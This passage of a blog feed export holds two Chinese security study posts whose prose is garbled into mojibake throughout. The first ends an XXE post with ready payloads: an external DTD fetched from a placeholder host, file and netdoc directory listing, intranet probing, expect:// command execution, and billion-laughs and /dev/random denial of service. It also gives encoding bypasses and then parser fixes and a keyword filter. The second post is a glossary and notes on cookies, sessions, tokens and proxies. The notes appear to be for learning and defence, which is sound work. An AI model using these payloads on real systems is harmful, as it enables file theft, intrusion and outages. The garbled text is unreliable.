</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>POSTæ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &amp;allæ˜¯ä½¿ç”¨evil.dtdä¸­çš„å®ä½“--&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;  </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605204320348.png" alt="image-20230605204320348"></p><h4 id="åˆ—ç›®å½•â€“JAVA"><a href="#åˆ—ç›®å½•â€“JAVA" class="headerlink" title="åˆ—ç›®å½•â€“JAVA"></a>åˆ—ç›®å½•â€“JAVA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607100242865.png" alt="image-20230607100242865"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;netdoc:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><h4 id="å†…ç½‘æ¢é’ˆ"><a href="#å†…ç½‘æ¢é’ˆ" class="headerlink" title="å†…ç½‘æ¢é’ˆ"></a>å†…ç½‘æ¢é’ˆ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://å†…ç½‘ip:port&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><h4 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h4><blockquote><p>è¯¥ CASE æ˜¯åœ¨å®‰è£… expect æ‰©å±•çš„ PHP ç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://å‘½ä»¤&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h4 id="DOSæ”»å‡»"><a href="#DOSæ”»å‡»" class="headerlink" title="DOSæ”»å‡»"></a>DOSæ”»å‡»</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [  &lt;!ENTITY lol &quot;lol&quot;&gt;  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; </span><br></pre></td></tr></table></figure><p>æ­¤æµ‹è¯•å¯ä»¥åœ¨å†…å­˜ä¸­å°†å°å‹ XML æ–‡æ¡£æ‰©å±•åˆ°è¶…è¿‡ 3GB è€Œä½¿æœåŠ¡å™¨å´©æºƒã€‚<br>äº¦æˆ–è€…ï¼Œå¦‚æœç›®æ ‡æ˜¯UNIXç³»ç»Ÿï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœ XML è§£æå™¨å°è¯•ä½¿ç”¨<code>/dev/random</code>æ–‡ä»¶ä¸­çš„å†…å®¹æ¥æ›¿ä»£å®ä½“ï¼Œåˆ™æ­¤ç¤ºä¾‹ä¼šä½¿æœåŠ¡å™¨ï¼ˆä½¿ç”¨ UNIX ç³»ç»Ÿï¼‰å´©æºƒã€‚</p><h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><ul><li>pharåè®®ååºåˆ—åŒ–</li><li><a href="https://xz.aliyun.com/t/3741">åˆ©ç”¨EXCELè¿›è¡ŒXXEæ”»å‡»</a></li><li>ä¸Šä¼ svgï¼Œdocxç­‰xmlæ ¼å¼çš„æ–‡ä»¶è¿›è¡Œæ”»å‡»</li><li>javaâ€“jaråè®®è§£å‹å‹ç¼©åŒ…</li></ul><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><ul><li><p>æ’å…¥ç©ºæ ¼</p><p>å¯ä»¥åœ¨<code>&lt;?xml</code>æˆ–<code>&lt;!DOCTYPE</code>åæ’å…¥ä»»æ„æ•°é‡çš„ç©ºæ ¼</p><p><img src="/../images/image-20230605205020027.png" alt="image-20230605205020027"></p></li><li><p>ç¼–ç ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UTF-7</span><br><span class="line">UTF-16â€ŠBEï¼ŒUTF-16â€ŠLE</span><br><span class="line">UTF-32â€ŠBEã€UTF-32LEã€UTF-322143ã€UTF-323412</span><br><span class="line">EBCDIC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-7 &gt; payload.7.xml</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606145117482.png" alt="image-20230606145117482"></p></li></ul><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><p><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">7.XXEinjectorï¼šä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„è‡ªåŠ¨åŒ–XXEæ³¨å°„å·¥å…· - bmjoker - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><ul><li>ç¦ç”¨å¤–éƒ¨å®ä½“</li></ul><p>PHP: </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>); </span><br></pre></td></tr></table></figure><p>JAVA: </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SAXBuilder</span></span><br><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DocumentBuilder</span></span><br><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>  DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">documentBuilder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXReader</span></span><br><span class="line"><span class="type">SAXReader</span> <span class="variable">saxReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>();</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXTransformerFactory</span></span><br><span class="line"><span class="type">SAXTransformerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// TransformerFactory</span></span><br><span class="line"><span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();      </span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unmarshaller é»˜è®¤æ–¹æ³•ä¸å­˜åœ¨xxeæ¼æ´</span></span><br></pre></td></tr></table></figure><p> Pythonï¼š </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><ul><li>è¿‡æ»¤ç”¨æˆ·æäº¤çš„ XML æ•°æ®</li></ul><p>å¦‚è¿‡æ»¤å…³é”®è¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE å’Œ&lt;!ENTITYï¼Œæˆ–è€… SYSTEM å’Œ PUBLIC</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p><p><a href="https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><p><a href="https://xz.aliyun.com/t/6829#toc-4">https://xz.aliyun.com/t/6829#toc-4</a></p><p><strong>è¡¥å……</strong>ï¼š<a href="https://tttang.com/archive/1813/#toc__2">https://tttang.com/archive/1813/#toc__2</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åè¯è§£é‡Š</title>
      <link href="/2023/06/01/%E6%A6%82%E5%BF%B5/"/>
      <url>/2023/06/01/%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="å¸¸è§åè¯è§£é‡Š"><a href="#å¸¸è§åè¯è§£é‡Š" class="headerlink" title="å¸¸è§åè¯è§£é‡Š"></a>å¸¸è§åè¯è§£é‡Š</h1><table><thead><tr><th align="center">åè¯</th><th align="center">è§£é‡Š</th></tr></thead><tbody><tr><td align="center">0day(Zero-day)</td><td align="center">æ²¡æœ‰è¡¥ä¸çš„å®‰å…¨æ¼æ´</td></tr><tr><td align="center">Nday</td><td align="center">å®˜æ–¹å‘å¸ƒäº†è¡¥ä¸ï¼Œä½†è¯¥æ¼æ´ä»ç„¶å¤§é‡æœªä¿®å¤ï¼Œå­˜åœ¨ä¸€å®šå¯åˆ©ç”¨æ€§</td></tr><tr><td align="center">POC</td><td align="center">ä¸€æ®µæ— å®³çš„ç”¨æ¥è¯æ˜æ¼æ´å­˜åœ¨çš„ä»£ç </td></tr><tr><td align="center">EXPï¼ˆexploitï¼‰</td><td align="center">ä¸€æ®µå¯¹æ¼æ´å¦‚ä½•åˆ©ç”¨çš„è¯¦ç»†è¯´æ˜æˆ–è€…ä¸€ä¸ªæ¼”ç¤ºçš„æ¼æ´æ”»å‡»ä»£ç </td></tr><tr><td align="center">payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰</td><td align="center">æŒ‡æˆåŠŸ exploit ä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤</td></tr><tr><td align="center">CVE</td><td align="center">Common Vulnerabilities &amp; Exposures å…¬å…±æ¼æ´å’Œæš´éœ²      CVEç¼–å·â€“æ¼æ´æ ‡ç­¾</td></tr><tr><td align="center">ShellCode</td><td align="center">ä¸€æ®µ16è¿›åˆ¶æœºå™¨ç ï¼Œå¯åœ¨æš‚å­˜å™¨eipæº¢å‡ºåï¼Œå¡å…¥ä¸€æ®µå¯è®©CPUæ‰§è¡Œçš„shellcodeæœºå™¨ç ï¼Œä»è€Œæ‰§è¡Œä»»æ„æŒ‡ä»¤ï¼ŒEIP<code>å¯„å­˜å™¨ï¼Œå®ƒé‡Œé¢å­˜æ”¾çš„å€¼æ˜¯</code>CPU<code>ä¸‹æ¬¡è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¿®æ”¹</code>EIP<code>å¯„å­˜å™¨çš„å€¼æ¥æ‰§è¡Œ</code>shellcode</td></tr><tr><td align="center">FUZZ</td><td align="center">æ¨¡ç³Šæµ‹è¯•ï¼šéšæœºè¾“å…¥ï¼Œè§‚å¯Ÿè¾“å‡º</td></tr><tr><td align="center">CMS</td><td align="center">å†…å®¹ç®¡ç†ç³»ç»Ÿ ï¼šå†…å®¹çš„åˆ›ä½œäººå‘˜ã€ç¼–è¾‘äººå‘˜ã€å‘å¸ƒäººå‘˜ä½¿ç”¨å†…å®¹ç®¡ç†ç³»ç»Ÿæ¥æäº¤ã€ä¿®æ”¹ã€å®¡æ‰¹ã€å‘å¸ƒå†…å®¹ã€‚</td></tr><tr><td align="center">CNVD</td><td align="center">China National Vulnerability Database                                   å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°</td></tr><tr><td align="center">Rootkit</td><td align="center">è½½å…¥åˆ°æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„æ¶æ„è½¯ä»¶ï¼Œå…·æœ‰rootæƒé™</td></tr><tr><td align="center">WAF</td><td align="center">Webåº”ç”¨é˜²ç«å¢™ï¼Œå…·æœ‰é’ˆå¯¹ HTTP&#x2F;HTTPS çš„å®‰å…¨ç­–ç•¥</td></tr><tr><td align="center">å ¡å’æœº</td><td align="center">ç›‘æ§å’Œè®°å½•è¿ç»´äººå‘˜å¯¹ç½‘ç»œå†…çš„æœåŠ¡å™¨ã€ç½‘ç»œè®¾å¤‡ã€å®‰å…¨è®¾å¤‡ã€æ•°æ®åº“ç­‰è®¾å¤‡çš„æ“ä½œè¡Œä¸ºï¼Œä»¥ä¾¿é›†ä¸­æŠ¥è­¦ã€åŠæ—¶å¤„ç†åŠå®¡è®¡å®šè´£ã€‚</td></tr><tr><td align="center">å½©è™¹è¡¨</td><td align="center">ç©ºé—´æ¢æ—¶é—´ï¼Œé€šè¿‡å“ˆå¸Œç¢°æ’ç ´è§£å“ˆå¸Œå€¼</td></tr><tr><td align="center">ä¾›åº”é“¾æ”»å‡»</td><td align="center">æ”»å‡»è½¯ä»¶ä¾›åº”å•†ï¼Œå¦‚å‘æ›´æ–°ç¨‹åºä¸­æ³¨å…¥æœ¨é©¬</td></tr><tr><td align="center">æ²™ç®±</td><td align="center">è™šæ‹Ÿç³»ç»Ÿç¨‹åºï¼š     åœ¨éš”ç¦»ç¯å¢ƒä¸­ï¼Œç”¨ä»¥æµ‹è¯•ä¸å—ä¿¡ä»»çš„æ–‡ä»¶æˆ–åº”ç”¨ç¨‹åºç­‰è¡Œä¸ºçš„å·¥å…·</td></tr><tr><td align="center">åŸŸåæ³›è§£æ</td><td align="center"><code>*.a.com</code>æŒ‡å‘åŒä¸€IP</td></tr><tr><td align="center">CMS</td><td align="center">å†…å®¹ç®¡ç†ç³»ç»Ÿï¼šæŒ‡çš„æ˜¯ä¸€ç§å†…å®¹ç¼–è¾‘ç¨‹åºã€‚å°±åƒåœ¨åšå®¢å†™æ–‡ç« ä¸€æ ·ï¼Œä¸éœ€è¦æ‡‚å¾—ç¼–ç¨‹çš„äººï¼Œä¹Ÿå¯ä»¥é€šè¿‡CMSå‘å¸ƒï¼Œæ›´æ”¹ï¼Œç®¡ç†å†…å®¹ã€‚</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><h1 id="è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«"><a href="#è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«" class="headerlink" title="è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«"></a>è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«</h1><p><img src="/../images/image-20230518203842099.png" alt="image-20230518203842099"></p><h1 id="token-x2F-cookie-x2F-session"><a href="#token-x2F-cookie-x2F-session" class="headerlink" title="token&#x2F;cookie&#x2F;session"></a>token&#x2F;cookie&#x2F;session</h1><p><a href="https://www.bilibili.com/video/BV1ob4y1Y7Ep">https://www.bilibili.com/video/BV1ob4y1Y7Ep</a></p><ol><li><p>cookie</p><ul><li><p>äº§ç”Ÿçš„åŸå› </p><p>å› ä¸ºhttpæ˜¯æ— çŠ¶æ€åè®®ï¼Œå‡è®¾æˆ‘ä»¥khazçš„èº«ä»½å»è®¿é—®æœåŠ¡å™¨ï¼Œç­‰åˆ°ä¸‹ä¸€æ¬¡æˆ‘å†æ¬¡è®¿é—®æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨è¿˜æ˜¯ä¸çŸ¥é“æˆ‘æ˜¯è°ï¼Œæˆ‘ä»éœ€è¦å‘æœåŠ¡å™¨æäº¤æ•°æ®è¯´æ˜æˆ‘æ˜¯khazã€‚è¿™æ ·å°±å¯¼è‡´äº†åœ¨åŒä¸€ä¸ªç½‘ç«™ä¸‹æˆ‘æ¯æ¬¡è®¿é—®ä¸€ä¸ªæœåŠ¡éƒ½éœ€è¦æäº¤ä¸€æ¬¡æ•°æ®ï¼Œå¾ˆéº»çƒ¦ã€‚</p></li><li><p>æœ¬è´¨</p><p>æµè§ˆå™¨å­˜å‚¨æŠ€æœ¯ï¼Œå®ç°æ¯æ¬¡HTTPè¯·æ±‚éƒ½è‡ªåŠ¨æäº¤æ•°æ®ç»™æœåŠ¡å™¨çš„æŠ€æœ¯ã€‚</p></li><li><p>æœºåˆ¶</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡å™¨è¿”å›çš„responseä¸­ä¼šæœ‰ä¸€ä¸ªset-cookieå­—æ®µï¼Œå½“æˆ‘ä»¬çš„æµè§ˆå™¨æ¥æ”¶åˆ°responseåï¼Œå°±ä¼šå°†set-cookieä¸­çš„å€¼ä¿å­˜åˆ°cookieä¸­ï¼Œç„¶åæ¯æ¬¡æˆ‘ä»¬ç™»é™†æ—¶æµè§ˆå™¨å°±ä¼šè‡ªåŠ¨åœ¨è¯·æ±‚ä¸­ä¸ºæˆ‘ä»¬å¸¦ä¸Šcookieï¼ŒæœåŠ¡ç«¯æ¥æ”¶åå»æ•°æ®åº“ä¸­æ ¸å®cookieä¿¡æ¯ã€‚</p></li><li><p>å®ä¾‹</p><p>é€šå¸¸ï¼Œæˆ‘ä»¬å¯ä»¥ä»å¾ˆå¤šç½‘ç«™çš„ç™»å½•ç•Œé¢ä¸­çœ‹åˆ°â€œè¯·è®°ä½æˆ‘â€è¿™æ ·çš„é€‰é¡¹ï¼Œå¦‚æœä½ å‹¾é€‰äº†å®ƒä¹‹åå†ç™»å½•ï¼Œé‚£ä¹ˆåœ¨ä¸‹ä¸€æ¬¡è®¿é—®è¯¥ç½‘ç«™çš„æ—¶å€™å°±ä¸éœ€è¦è¿›è¡Œé‡å¤è€Œç¹ççš„ç™»å½•åŠ¨ä½œäº†ï¼Œè€Œè¿™ä¸ªåŠŸèƒ½å°±æ˜¯é€šè¿‡Cookieå®ç°çš„ã€‚</p></li></ul></li><li><p>session</p><ul><li><p>äº§ç”Ÿçš„åŸå› </p><p>å› ä¸ºcookieæ˜¯ä¿å­˜åœ¨æµè§ˆå™¨ä¸­çš„ï¼Œç”¨æˆ·å¯ä»¥éšæ„æŸ¥çœ‹å’Œä¿®æ”¹å¾ˆä¸å®‰å…¨ã€‚</p></li><li><p>æœ¬è´¨</p><p>ä¸€ç§æ¦‚å¿µã€‚è®©HTTPä»æ— çŠ¶æ€è¿æ¥å˜ä¸ºæœ‰çŠ¶æ€è¿æ¥ï¼ˆä¼šè¯çŠ¶æ€ï¼‰ã€‚</p></li><li><p>æœºåˆ¶</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡ç«¯ä¼šåœ¨å†…å­˜ä¸­ç”Ÿæˆsessionå¯¹è±¡ç”¨äºä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒæ—¶é€šè¿‡set-cookieå­—æ®µå°†session-idä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚åœ¨ä¼šè¯çš„æœ‰æ•ˆæœŸå†…ï¼Œå®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå¸¦ä¸Šsession-idï¼ŒæœåŠ¡ç«¯æ ¹æ®session-idæ‰¾åˆ°å¯¹åº”çš„sessionï¼Œæ ¸å®ç”¨æˆ·çš„èº«ä»½ã€‚</p><blockquote><p>æ³¨ï¼šä¼šè¯çš„æœ‰æ•ˆæœŸæ˜¯é€šè¿‡è®¾ç½®cookieçš„æœ‰æ•ˆæœŸå®ç°çš„ã€‚</p></blockquote></li></ul></li><li><p>token</p><ul><li><p>äº§ç”Ÿçš„åŸå› </p><p>å› ä¸ºsessionçš„æœºåˆ¶ï¼ŒæœåŠ¡ç«¯éœ€è¦åœ¨å†…å­˜ä¸­ä¿å­˜sessionï¼Œå°±ä¼šå‡ºç°ä¸€äº›é—®é¢˜ã€‚ä¾‹å¦‚ï¼š</p><ul><li>å¤§é‡sessionå¯¹è±¡çš„å­˜å‚¨å¸¦æ¥çš„å†…å­˜æ¶ˆè€—</li><li>å„æœåŠ¡å™¨ä¹‹é—´sessionçš„å¤åˆ¶</li><li>ä¸“é—¨ç”¨äºå­˜å‚¨sessionçš„æœåŠ¡å™¨å®•æœº</li></ul></li><li><p>æœ¬è´¨</p><p>èº«ä»½ä»¤ç‰Œ</p></li><li><p>æœºåˆ¶</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»é™†åï¼ŒæœåŠ¡ç«¯ä¼šç”Ÿæˆä¸€ä¸ªtokenä»¤ç‰Œã€‚é€šè¿‡ set-cookieå­—æ®µä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚</p><p>åœ¨ä»¤ç‰Œçš„æœ‰æ•ˆæœŸå†…ï¼Œå®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå¸¦ä¸Štokenä»¤ç‰Œï¼ŒæœåŠ¡ç«¯é€šè¿‡ä¿å­˜çš„å¯†é’¥éªŒè¯ç­¾åæ¥æ ¸å¯¹ç”¨æˆ·èº«ä»½ã€‚</p></li><li><p>å®ä¾‹</p><p> json web tokenï¼ŒJWT</p><p>æ€»ç»“</p><blockquote><p>cookieï¼š</p><p>å®¢æˆ·ç«¯ä¿å­˜ï¼ŒæœåŠ¡ç«¯ä¸ä¿å­˜ã€‚</p><p>sessionï¼š</p><p>å®¢æˆ·ç«¯åªä¿å­˜session-idï¼ŒæœåŠ¡ç«¯ä¿å­˜sessionå¯¹è±¡ã€‚</p><p>tokenï¼š</p><p>å®¢æˆ·ç«¯ä¿å­˜tokenï¼ŒæœåŠ¡ç«¯åªä¿å­˜tokenç­¾åçš„å¯†é’¥ã€‚</p></blockquote></li></ul></li></ol><h1 id="æ­£å‘-x2F-åå‘ä»£ç†"><a href="#æ­£å‘-x2F-åå‘ä»£ç†" class="headerlink" title="æ­£å‘&#x2F;åå‘ä»£ç†"></a>æ­£å‘&#x2F;åå‘ä»£ç†</h1><p><a href="https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/">https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/</a></p><ul><li><p>æ­£å‘ä»£ç†</p><blockquote><p>è½¬å‘ä»£ç†ï¼Œé€šå¸¸ç§°ä¸ºä»£ç†ã€ä»£ç†æœåŠ¡å™¨æˆ– Web ä»£ç†ï¼Œæ˜¯ä½äºä¸€ç»„å®¢æˆ·ç«¯è®¡ç®—æœºä¹‹å‰çš„æœåŠ¡å™¨,ç¡®ä¿æ²¡æœ‰æºç«™ç›´æ¥ä¸è¯¥ç‰¹å®šå®¢æˆ·ç«¯é€šä¿¡</p></blockquote><p><img src="/../images/forward-proxy-flow.svg" alt="æ­£å‘ä»£ç†æµ"></p></li></ul><p>â€‹        åœ¨æ ‡å‡†çš„äº’è”ç½‘é€šä¿¡ä¸­ï¼Œè®¡ç®—æœº A å°†ç›´æ¥ä¸è®¡ç®—æœº C ä¿æŒè”ç³»ï¼Œå®¢æˆ·ç«¯å°†è¯·æ±‚å‘é€åˆ°<a 